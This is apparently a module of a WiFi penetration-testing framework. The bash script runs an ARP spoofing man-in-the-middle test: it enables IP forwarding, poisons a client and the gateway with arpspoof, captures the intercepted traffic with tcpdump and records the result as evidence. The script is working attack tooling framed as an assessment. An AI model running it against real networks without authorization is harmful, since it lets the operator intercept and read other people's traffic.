#!/usr/bin/env bash
# MODULE_META
# NAME="ARP Spoofing / MITM Test"
# CATEGORY="G"
# DEPS="B1"
# CRITICAL="yes"
# TOOLS="arpspoof,ip,tcpdump"
# DESC="Attempt to ARP-spoof the gateway to intercept traffic"
# REQS="managed_iface,gateway_ip"
# PCAP="yes"
# DECODE="mitm_arp_tls"

#===============================================================================
#  modules/g1_arp_spoofing.sh
#  G1: ARP Spoofing / MITM Test
#
#  PURPOSE:
#    Test if ARP spoofing is possible on the target WiFi network.
#    If successful, this enables Man-in-the-Middle (MITM) attacks.
#
#  TOOLS: arpspoof, ettercap, tcpdump
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: B1 (client isolation results)
#===============================================================================

run_g1() {
    set -uo pipefail
    
    local interface=""
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
    local target_ip=""
    local gateway_ip="${GATEWAY_IP:-}"
    local timeout="${G1_TIMEOUT:-60}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --target-ip) target_ip="$2"; shift 2 ;;
            --gateway-ip) gateway_ip="$2"; shift 2 ;;
            --timeout) timeout="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks
    interface="${interface:-${WIFI_INTERFACE:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
    gateway_ip="${gateway_ip:-${GATEWAY_IP:-}}"
    local evidence_prefix="${evidence_dir}/g1"

    local total_steps=6

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "G1" || return 1

    # Ensure monitor mode is globally disabled
    WIFI_INTERFACE="$interface"
    ensure_managed_mode || return 1

    local my_ip=$(ip -4 addr show "$interface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || echo "")
    if [[ -z "$my_ip" || -z "$gateway_ip" ]]; then
        log_error "No IP/gateway configured. Connect to target WiFi first."
        return 1
    fi

    if [[ -z "$target_ip" ]]; then
        # Try to find a target from B1 if not provided
        if has_tc_results "B1"; then
            local b1_data=$(load_tc_result "B1")
            target_ip=$(echo "$b1_data" | jq -r '.reachable_clients[0].ip // ""')
        fi
        # Fallback to gateway if no other target
        target_ip="${target_ip:-$gateway_ip}"
    fi

    log_success "Interface: ${interface}, IP: ${my_ip}, Target: ${target_ip}, Gateway: ${gateway_ip}"

    #--- Step 2: Record baseline ARP state ---
    log_step 2 $total_steps "Recording baseline ARP table"
    update_tc_progress 2 $total_steps "Baseline"

    local arp_before="${evidence_prefix}_arp_table_before.txt"
    ip neigh show dev "$interface" > "$arp_before"

    local my_mac=$(ip link show "$interface" | awk '/ether/{print $2}')

    #--- Step 3: Enable IP forwarding & start ARP spoof ---
    log_step 3 $total_steps "Attempting ARP spoofing"
    update_tc_progress 3 $total_steps "ARP spoof"

    # Enable IP forwarding
    local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

    local capture_file="${evidence_prefix}_mitm_capture.pcap"
    spawn_bg "g1_tcpdump" "tcpdump" -i "$interface" -w "$capture_file" "not arp and not host ${my_ip}"

    # Start spoofing
    spawn_bg "g1_spoof1" "arpspoof" -i "$interface" -t "$target_ip" "$gateway_ip"
    spawn_bg "g1_spoof2" "arpspoof" -i "$interface" -t "$gateway_ip" "$target_ip"

    start_countdown "$timeout" "ARP spoofing active"
    sleep "$timeout"
    stop_countdown

    stop_process "g1_spoof1"
    stop_process "g1_spoof2"
    stop_process "g1_tcpdump"

    # Restore IP forwarding
    echo "${orig_forwarding}" > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

    #--- Step 4: Verify ARP table after attack ---
    log_step 4 $total_steps "Verifying ARP table after attack"
    update_tc_progress 4 $total_steps "ARP verify"

    local arp_after="${evidence_prefix}_arp_table_after.txt"
    ip neigh show dev "$interface" > "$arp_after"

    # Check for interception (Simplified)
    local traffic_intercepted="false"
    if [[ -f "$capture_file" ]] && [[ $(stat -c%s "$capture_file") -gt 100 ]]; then
        traffic_intercepted="true"
    fi

    #--- Step 5: Test gratuitous ARP acceptance ---
    log_step 5 $total_steps "Testing gratuitous ARP"
    update_tc_progress 5 $total_steps "GARP test"

    local arp_poisoned="false"
    if command -v arping &>/dev/null; then
        arping -U -c 3 -I "${interface}" "${gateway_ip}" &>/dev/null || true
        sleep 2
        local current_gw_mac=$(ip neigh show "$gateway_ip" dev "$interface" | awk '{print $5}' | head -1)
        if [[ "$current_gw_mac" == "$my_mac" ]]; then
            arp_poisoned="true"
        fi
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    local result_status="SECURE"
    if [[ "$traffic_intercepted" == "true" ]]; then
        result_status="FINDING"
    fi

    local result_json=$(run_tool jq -n \
        --arg status "$result_status" \
        --arg summary "ARP spoofing test completed." \
        --arg intercepted "$traffic_intercepted" \
        --arg poisoned "$arp_poisoned" \
        '{status: $status, summary: $summary, traffic_intercepted: ($intercepted == "true"), arp_poisoned: ($poisoned == "true")}')

    evidence_register_file "$arp_before"
    evidence_register_file "$arp_after"
    evidence_register_file "$capture_file"

    save_tc_result "G1" "$result_json" 1 1 1 1 1 1 0 1 1 1 0
    return 0
}
